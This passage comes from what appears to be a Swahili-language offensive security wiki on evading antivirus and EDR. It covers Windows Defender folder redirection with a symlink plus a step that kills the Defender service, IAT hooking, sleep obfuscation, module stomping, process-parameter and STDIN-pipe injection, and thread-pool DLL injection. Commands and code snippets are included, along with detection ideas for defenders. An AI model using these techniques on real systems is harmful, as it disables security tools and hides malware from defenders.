2) Tengeneza symlink ya saraka ya toleo la juu ndani ya Platform inayoelekeza kwenye folda yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uteuzi wa trigger (inapendekezwa kuwasha upya):
```cmd
shutdown /r /t 0
```
4) Thibitisha kwamba MsMpEng.exe (WinDefend) inaendeshwa kutoka kwenye njia iliyoelekezwa kwingine:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Unapaswa kuona njia mpya ya process chini ya `C:\TMP\AV\` na service configuration/registry zikionyesha eneo hilo.

Chaguo za post-exploitation
- DLL sideloading/code execution: Weka au badilisha DLL ambazo Defender hupakia kutoka kwenye saraka yake ya programu ili kutekeleza code katika processes za Defender. Tazama sehemu iliyo hapo juu: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili kwenye start inayofuata njia iliyosanidiwa isiweze kutatuliwa na Defender ishindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Kumbuka kuwa technique hii haitoi privilege escalation yenyewe; inahitaji haki za admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams zinaweza kuhamishia runtime evasion kutoka kwenye C2 implant na kuiweka ndani ya target module yenyewe kwa ku-hook Import Address Table (IAT) yake na kuelekeza APIs zilizochaguliwa kupitia code inayodhibitiwa na mshambuliaji, yaani position-independent code (PIC). Hii huongeza evasion zaidi ya API chache zinazotolewa na kits nyingi (kwa mfano, CreateProcessA), na kupanua ulinzi huohuo hadi kwenye BOFs na post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Mbinu ya jumla
- Stage PIC blob pamoja na target module kwa kutumia reflective loader (ikiwa imeongezwa mwanzoni au kama companion). PIC lazima ijitegemee na iwe position-independent.
- Host DLL inapopakia, pitia IMAGE_IMPORT_DESCRIPTOR yake na urekebishe entries za IAT za imports zilizolengwa (kwa mfano, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) zielekeze kwenye wrappers nyembamba za PIC.
- Kila PIC wrapper hutekeleza evasion kabla ya kuita API halisi kwa tail-call. Evasion za kawaida ni pamoja na:
  - Kufanya memory mask/unmask kuzunguka call (kwa mfano, kusimba maeneo ya beacon, RWX→RX, kubadilisha majina/ruhusa za kurasa), kisha kurejesha hali ya awali baada ya call.
  - Call-stack spoofing: kuunda stack isiyo na madhara na kuingia kwenye target API ili uchanganuzi wa call-stack ubaini frames zinazotarajiwa.<sup>[[9]](#references)</sup>
- Kwa ajili ya compatibility, export interface ili Aggressor script (au inayolingana nayo) iweze kusajili APIs za ku-hook kwa Beacon, BOFs na post-ex DLLs.

Kwa nini IAT hooking hapa
- Hufanya kazi kwa code yoyote inayotumia import iliyo-hookiwa, bila kurekebisha code ya tool au kutegemea Beacon kupitisha APIs maalum.
- Hushughulikia post-ex DLLs: ku-hook LoadLibrary* hukuwezesha kunasa upakiaji wa modules (kwa mfano, System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion hiyo hiyo kwenye API calls zao.
- Hurejesha matumizi ya kuaminika ya amri za post-ex zinazozindua processes dhidi ya detections zinazotegemea call-stack kwa ku-wrapping CreateProcessA/W.

Mchoro mdogo wa IAT hook (pseudocode ya x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Maelezo
- Tumia patch baada ya relocations/ASLR na kabla import haijatumika kwa mara ya kwanza. Reflective loaders kama TitanLdr/AceLdr huonyesha hooking wakati wa DllMain ya module iliyopakiwa.
- Weka wrappers ndogo na salama kwa PIC; tatua API halisi kupitia thamani ya awali ya IAT uliyonasa kabla ya kuweka patch au kupitia LdrGetProcedureAddress.
- Tumia mabadiliko ya RW → RX kwa PIC na uepuke kuacha kurasa zikiwa writable+executable.

Stub ya call‑stack spoofing
- PIC stubs za mtindo wa Draugr huunda call chain bandia (return addresses zinazoelekeza kwenye modules zisizo na madhara) kisha kuelekeza mtiririko kwenye API halisi.
- Hii hushinda detections zinazotarajia stacks za kawaida kutoka Beacon/BOFs kwenda kwenye APIs nyeti.
- Ziunganishe na mbinu za stack cutting/stack stitching ili kuingia ndani ya frames zinazotarajiwa kabla ya API prologue.

Ujumuishaji wa kiutendaji
- Weka reflective loader mwanzoni mwa post-ex DLLs ili PIC na hooks zianzishwe kiotomatiki DLL inapopakiwa.
- Tumia Aggressor script kusajili target APIs ili Beacon na BOFs zinufaike kwa uwazi na njia ileile ya evasion bila mabadiliko ya code.

Mazingatio ya Detection/DFIR
- Uadilifu wa IAT: entries zinazoelekeza kwenye anwani zisizo za image (heap/anon); uthibitishaji wa mara kwa mara wa import pointers.
- Hitilafu za stack: return addresses zisizo kwenye images zilizopakiwa; mabadiliko ya ghafla kwenda kwenye PIC isiyo ya image; ukoo wa RtlUserThreadStart usiolingana.
- Telemetry ya loader: writes za ndani ya process kwenda kwenye IAT, shughuli za mapema za DllMain zinazorekebisha import thunks, maeneo ya RX yasiyotarajiwa yanayoundwa wakati wa upakiaji.
- Kukwepa image-load: uki-hook LoadLibrary*, fuatilia upakiaji unaotiliwa shaka wa automation/clr assemblies unaohusiana na matukio ya memory masking.

Vipengele vya ujenzi na mifano inayohusiana
- Reflective loaders zinazofanya IAT patching wakati wa upakiaji (k.m., TitanLdr, AceLdr)
- Memory masking hooks (k.m., simplehook) na stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (k.m., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks kupitia PICO inayokaa kwenye kumbukumbu

Ikiwa unadhibiti reflective loader, unaweza ku-hook imports **wakati wa** `ProcessImports()` kwa kubadilisha pointer ya `GetProcAddress` ya loader na resolver maalum inayokagua hooks kwanza:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Tengeneza **resident PICO** (persistent PIC object) inayobaki baada ya transient loader PIC kujifuta.
- Export function ya `setup_hooks()` inayobadilisha import resolver ya loader (kwa mfano, `funcs.GetProcAddress = _GetProcAddress`).
- Katika `_GetProcAddress`, ruka ordinal imports na utumie utafutaji wa hook unaotegemea hash kama `__resolve_hook(ror13hash(name))`. Ikiwa hook ipo, irudishe; la sivyo, elekeza ombi kwa `GetProcAddress` halisi.
- Sajili malengo ya hook wakati wa link kwa maingizo ya Crystal Palace `addhook "MODULE$Func" "hook"`. Hook itaendelea kufanya kazi kwa sababu iko ndani ya resident PICO.

Hii huwezesha **import-time IAT redirection** bila kubadilisha code section ya DLL iliyopakiwa baada ya kupakiwa.

### Kulazimisha imports zinazoweza kuwekwa hook wakati target inatumia PEB-walking

Import-time hooks huanzishwa tu ikiwa function ipo kwenye IAT ya target. Ikiwa module inatatua APIs kupitia PEB-walk + hash (bila import entry), lazimisha import halisi ili njia ya loader ya `ProcessImports()` iione:

- Badilisha utatuzi wa hashed export (kwa mfano, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) na reference ya moja kwa moja kama `&WaitForSingleObject`.
- Compiler itatoa IAT entry, na hivyo kuwezesha interception wakati reflective loader inatatua imports.

### Obfuscation ya usingizi/idle ya mtindo wa Ekko bila kubadilisha `Sleep()`

Badala ya kubadilisha `Sleep`, weka hook kwenye **wait/IPC primitives halisi** zinazotumiwa na implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Kwa waits ndefu, funga mwito huo ndani ya mnyororo wa obfuscation wa mtindo wa Ekko unaosimba kwa njia fiche image iliyo kwenye memory wakati wa idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Tumia `CreateTimerQueueTimer` kuratibu mfuatano wa callbacks zinazoiita `NtContinue` kwa kutumia fremu za `CONTEXT` zilizoundwa mahsusi.
- Mfuatano wa kawaida (x64): weka image kuwa `PAGE_READWRITE` → fanya RC4 encrypt kupitia `advapi32!SystemFunction032` kwenye image nzima iliyomappiwa → fanya blocking wait → fanya RC4 decrypt → **rejesha ruhusa za kila sehemu** kwa kupitia sehemu za PE → toa ishara ya kukamilika.
- `RtlCaptureContext` hutoa kiolezo cha `CONTEXT`; nakili kwenye fremu nyingi na uweke registers (`Rip/Rcx/Rdx/R8/R9`) ili kuita kila hatua.

Maelezo ya kiutendaji: rudisha “success” kwa waits ndefu (kwa mfano, `WAIT_OBJECT_0`) ili caller iendelee huku image ikiwa imefichwa. Muundo huu huficha module dhidi ya scanners wakati wa vipindi vya kutotumika na huepuka saini ya kawaida ya “patched `Sleep()`”.

Mawazo ya utambuzi (yanayotegemea telemetry)
- Milipuko ya callbacks za `CreateTimerQueueTimer` zinazoelekeza kwenye `NtContinue`.
- Matumizi ya `advapi32!SystemFunction032` kwenye buffers kubwa na zilizo contiguous, zenye ukubwa wa image.
- `VirtualProtect` ya masafa makubwa ikifuatiwa na urejeshaji maalum wa ruhusa kwa kila sehemu.

### Usajili wa CFG wakati wa utekelezaji kwa gadgets za sleep-obfuscation

Kwenye targets zilizowezeshwa CFG, jump ya kwanza isiyo ya moja kwa moja inayoingia kwenye gadget ya katikati ya function, kama `jmp [rbx]` au `jmp rdi`, kwa kawaida itasababisha mchakato ku-crash kwa `STATUS_STACK_BUFFER_OVERRUN` kwa sababu gadget hiyo haipo kwenye metadata ya CFG ya module. Ili kuweka minyororo ya mtindo wa Ekko/Kraken ikiendelea kufanya kazi ndani ya michakato iliyoimarishwa usalama:<sup>[[30]](#references)</sup>

- Sajili kila lengwa lisilo la moja kwa moja linalotumiwa na chain kwa `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` na maingizo ya `CFG_CALL_TARGET_VALID`.
- Kwa anwani zilizo ndani ya image zilizopakiwa (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` lazima ianze kwenye **image base** na ihusishe **ukubwa wote wa image**.
- Kwa maeneo yaliyowekwa ramani kwa mikono/PIC/stomped, tumia **allocation base** na allocation size badala yake.
- Weka alama si kwa dispatch gadget pekee, bali pia kwa exports zinazofikiwa kwa njia isiyo ya moja kwa moja (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls) na sehemu zozote zinazoweza kutekelezwa zinazodhibitiwa na mshambuliaji ambazo zitakuwa malengo yasiyo ya moja kwa moja.

Hii hubadilisha sleep chains za mtindo wa ROP/JOP kutoka “hufanya kazi tu kwenye michakato isiyo na CFG” na kuwa primitive inayoweza kutumika tena kwa `explorer.exe`, browsers, `svchost.exe`, na endpoints nyingine zilizokompailiwa kwa `/guard:cf`.

### CET-safe stack spoofing kwa threads zinazolala

Ubadilishaji kamili wa `CONTEXT` huonekana wazi na unaweza kushindwa kwenye mifumo ya CET Shadow Stack kwa sababu `Rip` iliyoghushiwa lazima bado ilingane na hardware shadow stack. Muundo salama zaidi wa kuficha usingizi ni:<sup>[[30]](#references)</sup>

- Chagua thread nyingine ndani ya process hiyo hiyo na usome mipaka ya stack ya `NT_TIB` / TEB (`StackBase`, `StackLimit`) kupitia `NtQueryInformationThread`.
- Hifadhi nakala ya TEB/TIB halisi ya thread ya sasa.
- Nasa context halisi ya thread inayolala kwa kutumia `GetThreadContext`.
- Nakili **tu** `Rip` halisi kwenye spoof context, huku ukiacha `Rsp`/hali ya stack iliyofanyiwa spoof ikiwa salama.
- Katika kipindi cha usingizi, nakili `NT_TIB` ya spoof thread kwenye TEB ya sasa ili stack walkers wafanye unwind ndani ya masafa halali ya stack.
- Baada ya kusubiri kukamilika, rejesha TIB na thread context za awali.

Hii huhifadhi instruction pointer inayolingana na CET huku ikipotosha stack walkers za EDR zinazoamini metadata ya stack ya TEB ili kuthibitisha unwinds.

### Mbadala unaotumia APC: Kraken Mask

Ikiwa timer-queue dispatch inatambulika kwa urahisi mno, mfuatano huo huo wa sleep-encrypt-spoof-restore unaweza kutekelezwa kutoka kwa helper thread iliyosimamishwa kwa kutumia APC zilizowekwa kwenye foleni:<sup>[[27]](#references)</sup>

- Unda helper thread yenye `NtTestAlert` kama entrypoint.
- Weka foleni ya `CONTEXT` frames/APCs zilizoandaliwa kwa `NtQueueApcThread` na uzichakate kwa `NtAlertResumeThread`.
- Hifadhi hali ya chain kwenye heap badala ya helper stack ili kuepuka kuishiwa na stack chaguomsingi ya thread ya KB 64.
- Tumia `NtSignalAndWaitForSingleObject` kuashiria tukio la kuanza na kusubiri kwa njia ya atomiki.
- Simamisha main thread kabla ya kurejesha TIB/context (`NtSuspendThread` → restore → `NtResumeThread`) ili kupunguza muda ambao scanner anaweza kunasa stack iliyorejeshwa kwa sehemu.

Hii hubadilisha signature ya `CreateTimerQueueTimer` + `NtContinue` kuwa signature ya helper-thread/APC huku ikidumisha malengo yale yale ya kuficha kwa RC4 na spoofing ya stack.

Mawazo ya ziada ya ugunduzi
- `NtSetInformationVirtualMemory` yenye `VmCfgCallTargetInformation` muda mfupi kabla ya kulala, kusubiri au kutuma APC.
- `GetThreadContext`/`SetThreadContext` zinazotumika pamoja na `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` au `ConnectNamedPipe`.
- `NtQueryInformationThread` ikifuatiwa na writes za moja kwa moja kwenye mipaka ya stack ya TEB/TIB ya thread ya sasa.
- Chains za `NtQueueApcThread`/`NtAlertResumeThread` zinazofikia kwa njia isiyo ya moja kwa moja `SystemFunction032`, `VirtualProtect` au helpers za kurejesha ruhusa za section.
- Matumizi yanayojirudia ya signatures fupi za gadget kama `FF 23` (`jmp [rbx]`) au `FF E7` (`jmp rdi`) kama dispatch pivots ndani ya modules zilizosainiwa.


## Precision Module Stomping

Module stomping hutekeleza payloads kutoka **sehemu ya `.text` ya DLL ambayo tayari imewekwa kwenye ramani ndani ya mchakato lengwa**, badala ya kutenga memory ya faragha inayotekelezeka iliyo wazi au kupakia DLL mpya ya kutumika kama kafara. Lengo la overwrite linapaswa kuwa **image iliyopakiwa kutoka kwenye diski**, ambayo nafasi yake ya code inaweza kubeba payload bila kuharibu njia za code ambazo mchakato bado unahitaji.<sup>[[1]](#references)[[2]](#references)</sup>

### Uteuzi wa target unaotegemeka

Stomping ya kawaida dhidi ya modules zinazotumika mara nyingi kama `uxtheme.dll` au `comctl32.dll` si ya kutegemewa: DLL inaweza kuwa haijapakiwa kwenye process ya mbali, na code region ndogo mno itasababisha process ku-crash. Mtiririko wa kazi unaotegemeka zaidi ni:

1. Orodhesha modules za process lengwa na uhifadhi **listi ya include yenye majina pekee** ya DLL ambazo tayari zimepakiwa.
2. Unda payload kwanza na urekodi **ukubwa wake kamili kwa byte**.
3. Changanua DLL zinazoweza kutumika kwenye diski na ulinganishe **`.text` `Misc_VirtualSize`** ya sehemu ya PE na ukubwa wa payload. Hili ni muhimu zaidi kuliko ukubwa wa faili kwa sababu linaonyesha ukubwa wa sehemu inayotekelezeka **inapopakiwa kwenye memory**.
4. Changanua **Export Address Table (EAT)** na uchague function RVA iliyosafirishwa kama offset ya kuanzia ya stomp.
5. Kokotoa **eneo la madhara**: ikiwa payload inazidi mpaka wa function iliyochaguliwa, itaandika juu ya exports zilizo karibu zilizopangwa baada yake kwenye memory.

Helpers za kawaida za recon/uteuzi zinazoonekana kwenye matumizi halisi:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Pendelea DLLs ambazo **tayari zimepakiwa** katika remote process ili kuepuka telemetry ya `LoadLibrary`/upakiaji wa image usiotarajiwa.
- Pendelea exports ambazo programu lengwa huzitekeleza mara chache; vinginevyo, njia za kawaida za code zinaweza kufikia bytes zilizostomp kabla au baada ya thread kuundwa.
- Implants kubwa mara nyingi huhitaji kubadilisha jinsi shellcode inavyopachikwa: tumia **byte-array/braced initializer** badala ya string literal ili buffer nzima iwakilishwe kwa usahihi katika source ya injector.

Detection ideas
- Uandishi wa mbali kwenye kurasa zinazoweza kutekelezwa na zinazoungwa mkono na image (`MEM_IMAGE`, `PAGE_EXECUTE*`) badala ya allocations za kawaida zaidi za private RWX/RX.
- Entry points za exports ambazo bytes zake zilizo kwenye memory hazilingani tena na faili chanzo lililo kwenye diski.
- Remote threads au context pivots zinazoanza kutekelezwa ndani ya export halali ya DLL ambayo bytes zake za mwanzo zimebadilishwa hivi karibuni.
- Mfuatano wa kutiliwa shaka wa `VirtualProtect(Ex)` / `WriteProcessMemory` dhidi ya kurasa za `.text` za DLL, unaofuatwa na uundaji wa thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ni mbinu ya **process-injection / EDR-evasion** inayokwepa njia ya kawaida ya uandishi wa mbali (`VirtualAllocEx` + `WriteProcessMemory`). Badala ya kunakili bytes kwenye target ambayo tayari inaendeshwa, hutumia ukweli kwamba Windows **hunakili vigezo teule vya uanzishaji vya `CreateProcessW` kwenye child process** na kuvihifadhi ndani ya `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers zinazoweza kuwekewa sumu na kunakiliwa na `CreateProcessW`

Carriers zinazofaa ni:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (pamoja na `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Vizuizi vya vitendo kwa carriers:

- `lpCommandLine` lazima ielekeze kwenye **memory inayoweza kuandikwa** kwa `CreateProcessW`, na ina kikomo cha **herufi 32,767 za Unicode**, ikijumuisha terminator ya null.
- `lpEnvironment` lazima iwe block ya mazingira ya Unicode yenye mfuatano mfululizo wa `NAME=VALUE\0` na kumalizika kwa `\0` ya ziada.
- `lpReserved` imehifadhiwa rasmi, kwa hivyo ulinganifu wa `ShellInfo` unapaswa kuchukuliwa kuwa maelezo ya utekelezaji badala ya mkataba thabiti uliorekodiwa.

Hii hugeuza uundaji wa kawaida wa process kuwa **primitive ya kuhamisha payload**. Operator huunda child process kwa data ya uanzishaji inayodhibitiwa na mshambuliaji na kuiacha Windows ifanye nakala kati ya process.

### Mtiririko wa remote lookup bila remote write APIs

Baada ya child kuundwa, tambua buffer iliyonakiliwa kwa kutumia primitives za **kusoma tu**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → pata `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Soma remote `PEB`
3. Fuata `PEB.ProcessParameters`
4. Soma `RTL_USER_PROCESS_PARAMETERS`
5. Tumia pointer iliyochaguliwa:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Mtiririko wa chini kabisa:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kutekeleza parameter buffer iliyonakiliwa

Eneo la parameter lililonakiliwa kwa kawaida huwa `RW`, si la kutekelezeka. Msururu wa kawaida wa P3 ni:

1. Unda process kama kawaida (bila kuisimamisha)
2. Fanya ukurasa uliochaguliwa wa parameter uweze kutekelezeka kwa `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Tumia tena handle ya main thread iliyorejeshwa tayari katika `PROCESS_INFORMATION`
4. Elekeza upya utekelezaji kwa `NtSetContextThread` (`CONTEXT_CONTROL`, andika juu ya `RIP`)

Tofauti na taratibu za kawaida za thread hijacking, hii **haihitaji** `SuspendThread` / `ResumeThread`; context inaweza kubadilishwa moja kwa moja kupitia handle ya main thread iliyorejeshwa.

Hii huepusha API kadhaa ambazo hufuatiliwa kwa kawaida kwa ajili ya injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- mara nyingi pia `SuspendThread` / `ResumeThread`

### Kizuizi cha null-byte na shellcode ya hatua kwa hatua

Carriers zote tatu ni **data ya string au inayofanana na string**, kwa hiyo payload ghafi yenye `0x00` hukatwa wakati wa uhamishaji. Njia ya vitendo ya kulitatua ni kutumia **hatua ya kwanza isiyo na null** inayounda upya constants wakati wa utekelezaji, kisha kupakia hatua ya pili ya aina yoyote.

Muundo rahisi ni usanisi wa constant unaotegemea XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Hii huruhusu first stage kuunda mifuatano ya stack, hoja za API, njia za DLL au kipakiaji cha shellcode cha second stage bila kuweka null bytes kwenye parameter inayosafirishwa.

### Miito ya API inayotegemea stack kutoka first stage

Wakati first stage inahitaji kuita API kama `LoadLibraryA`, inaweza:

- kusukuma mfuatano/bafa kwenye stack ya target
- kutenga **nafasi ya shadow ya x64 yenye ukubwa wa baiti 32**
- kuweka `RCX`, `RDX`, `R8`, `R9` kuwa constants au pointers zinazohusiana na `RSP`
- kuhakikisha `RSP` imepangiliwa kwa **baiti 16** kabla ya mwito

Kisha second stage inaweza kunakiliwa kutoka stack hadi kwenye allocation ya `PAGE_READWRITE`, kubadilishwa kuwa `PAGE_EXECUTE_READ` kwa `VirtualProtect`, na kurukia, hivyo kuepuka allocation ya moja kwa moja ya RWX.

### Mawazo ya utambuzi

Fursa nzuri za kutafuta zilizotajwa na waandishi:

- `VirtualProtectEx` / `NtProtectVirtualMemory` kufanya **kurasa za process-parameter ziweze kutekeleza**
- mabadiliko hayo ya ulinzi yakifuatiwa na `SetThreadContext` / `NtSetContextThread`
- usomaji wa mbali wa `PEB` na kisha `RTL_USER_PROCESS_PARAMETERS`
- thamani za `lpCommandLine`, `lpEnvironment`, au `STARTUPINFO.lpReserved` zilizo ndefu isivyo kawaida / zenye entropy kubwa wakati wa kuunda process

### Maelezo

- P3 ni **mbinu ya kuhamisha data kati ya processes**, si primitive kamili ya utekelezaji yenyewe: parameter iliyonakiliwa bado inahitaji mabadiliko ya ruhusa ya kutekeleza na mbinu ya kuelekeza utekelezaji.
- `RtlCreateProcessReflection` / Dirty Vanity ilizingatiwa na waandishi lakini ikakataliwa kwa sababu ndani yake hutumia primitives zinazotia shaka kama `NtWriteVirtualMemory` na `NtCreateThreadEx`.

## Uingizaji wa pipe ya Console STDIN

Child ya console inayoingiliana pia inaweza kutumiwa kama **primitive ya kuhamisha payload**. Injector huelekeza standard input ya child kwenye pipe na kutuma marker ikifuatiwa na shellcode. Baada ya programu ya console kusoma data kwenye memory yake binafsi, injector hutafuta bafa hiyo, huiwezesha kutekelezeka na kuelekeza thread ya child humo. Hii huepuka `VirtualAllocEx` na `WriteProcessMemory`, lakini bado ni process injection badala ya EDR bypass ya jumla.<sup>[[41]](#references)</sup>

Licha ya maelezo ya "named-pipe", utekelezaji wa marejeo huita `CreatePipe`, ambayo huunda **anonymous pipe**. Windows hutekeleza anonymous pipes kwa kutumia vitu vya pipe vyenye majina ya kipekee ndani ya mfumo, lakini PoC haichagui njia ya `\\.\pipe\<name>` wala kuita `CreateNamedPipe`. Huunda handles zinazoweza kurithiwa zenye security descriptor ya chaguomsingi, huweka handle ya kusoma kwenye `STARTUPINFO.hStdInput`, huweka `STARTF_USESTDHANDLES`, na kuwasha child mpya huku urithishaji wa handle ukiwa umewashwa. Kwa hiyo, PoC hii huwasha console executable iliyotolewa; haiunganishi pipe yake na process iliyopo.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Mtiririko wa marejeo

Utekelezaji hutumia mfuatano ufuatao:<sup>[[41]](#references)</sup>

1. Unda jozi za anonymous pipe kwa `STDIN` na `STDOUT` za child. Zima urithishaji kwenye handles mbili za upande wa parent na ufunge nakala za upande wa child katika parent baada ya kuunda process.
2. Washa executable inayoingiliana kama `netsh.exe` au `nslookup.exe` kwa `CREATE_NEW_CONSOLE`. Child hurithi standard handles zilizoelekezwa upya.
3. Tuma safu kamili ya binary ya `rawData` kwa `WriteFile` kupitia handle ya `STDIN` ya upande wa parent. Programu ya console hutumia baiti hizo na kuacha nakala katika mojawapo ya maeneo yake binafsi yaliyotengwa.
4. Kagua nafasi ya anwani ya child kwa `VirtualQueryEx`, soma maeneo lengwa ya `MEM_PRIVATE` kwa `ReadProcessMemory`, na utafute marker mwanzoni mwa `rawData`.
5. Badilisha bafa iliyopatikana kuwa `PAGE_EXECUTE_READWRITE` kwa `VirtualProtectEx`.
6. Tambua thread kuu, isimamishe, weka `RIP` kuwa `found_address + 0x19` kwa `NtSetContextThread`, kisha iendelee.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Utekelezaji uliotolewa ni mahususi kwa x64: unarekebisha `CONTEXT.Rip`, na payload yake iliyopachikwa ni x64 shellcode. `rawData` huanza na alama ya baiti 25, kwa hiyo baiti zinazoweza kutekelezwa huanza kwenye offset ya heksadesimali `0x19`. Unapobadilisha payload, hifadhi mpangilio huo au usasishe alama, search vector, ukubwa wa array na execution offset kwa pamoja. Maoni ya chanzo pia yanaorodhesha `0x0A`, `0x0D` na `0x1A` kama herufi zisizofaa. Mchakato huu haubadilishi token au privileges za child process.<sup>[[41]](#references)</sup>

Kwa mifano ya small native helpers na payload compilation patterns, angalia [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## DLL injection ya thread-pool callback bila shellcode (DLLParty)

DLLParty hubadilisha thread-pool injection ya mtindo wa PoolParty ili kufanya worker aliyepo kwenye target aite `LoadLibraryA`, badala ya kutekeleza callback stub iliyoingizwa. Primitive yake ya dispatch ni `TP_DIRECT` completion inayowekwa kwenye I/O completion port ya target pool. Hii haibypass ruhusa za process: PoC huita `OpenProcess(PROCESS_ALL_ACCESS)` na inahitaji kumbukumbu ya target inayosomeka/kuandikika pamoja na worker-factory na completion-port handles zinazoweza kuduplicatiwa.<sup>[[46]](#references)[[47]](#references)</sup>

Kwenye Windows x64, worker hupitisha pointer ya `TP_CALLBACK_INSTANCE` iliyohifadhiwa kwenye stack yake kupitia `RCX`, argument ya kwanza ya callback. `LoadLibraryA` hutafsiri pointer hiyo hiyo kama `LPCSTR`. Kwenye njia iliyojaribiwa, `TppWorkerThread` huunda pointer kwenye `RSP+0x178`, ilhali write yake ya kwanza ya kawaida kwenye object hiyo hufanyika kwenye `RSP+0x1d0`. Kwa hiyo, njia ya DLL inayoishia na null na inayotoshea ndani ya prefix hii ya baiti 0x58 inaweza kuwekwa mwanzoni mwa instance bila kufutwa kabla ya dispatch. Huu ni uchunguzi mahususi kwa build, si dhamana iliyoandikwa kwenye Windows ABI.<sup>[[46]](#references)[[47]](#references)</sup>

Mtiririko wa marejeo ni:<sup>[[46]](#references)[[47]](#references)</sup>

1. Orodhesha handles za target kwa `NtQuerySystemInformation(SystemHandleInformation)` na utambue `TpWorkerFactory` kwa kuuliza aina za object. Duplicate worker-factory handle na uulize `WorkerFactoryBasicInformation`; `StartParameter` hutoa `TP_POOL` ya remote. Ruka factories zenye `TotalWorkerCount == 0`.
2. Soma `TP_POOL.CompletionPort` na pitia worker list ya ndani ya pool. Kwenye build iliyojaribiwa ya Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`), kichwa chake kiko kwenye `pool+0x60`; kila link iko kwenye `worker+0x10`, kwa hiyo slot ya callback-instance kwenye `worker+0x38` ni sawa na `link+0x28`. PoC hukagua mpangilio wa pointer, ulinganifu wa link, umiliki wa pool, thread IDs zisizo sifuri, nodes zilizojirudia na kichwa cha list kisichobadilika.
3. Andika njia ya DLL kwenye **kila** slot ya worker iliyopatikana kwa sababu completion iliyowekwa kwenye foleni inaweza kuchukuliwa na worker yeyote. Weka `TP_DIRECT` yenye `Callback = LoadLibraryA` kwenye kumbukumbu ya target inayoweza kuandikwa. PoC hutumia `last_slot-0x500` kwenye worker stack badala ya `VirtualAllocEx`; offset hiyo ni ya majaribio na haipaswi kugongana na data ya stack inayotumika.
4. Duplicate handle ya target completion-port na uite `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Anwani ya remote `TP_DIRECT` ndiyo completion key. Worker aliyepo kisha huita `LoadLibraryA` kwa kutumia pointer yake ya callback-instance iliyobadilishwa, na kupakia DLL ambayo target inaweza kuifikia.

PoC hupokea PID ya target (`DLLParty.exe <target_pid>`) na hutumia njia ya DLL iliyowekwa moja kwa moja kwenye `DLLParty.cpp`; weka njia ambayo target inaweza kufikia kabla ya kujenga executable ya x64. Pia hutumia anwani ya `LoadLibraryA` ya process yake yenyewe kama remote callback, kwa hiyo hudhani anwani hiyo ni halali kwenye target. Code haikague urefu wa njia dhidi ya prefix ya baiti 0x58 wala kuthibitisha kuwa worker traversal imepata slot kabla ya kuorodhesha element ya mwisho. Thibitisha upya offsets za ndani, mpangilio wa stack na nafasi inayoweza kuandikwa kwa build ya target. Kuacha kutumia `CreateRemoteThreadEx`, shellcode na `VirtualAllocEx` hakuondoi writes za cross-process au telemetry ya kupakia DLL.<sup>[[46]](#references)[[47]](#references)</sup>

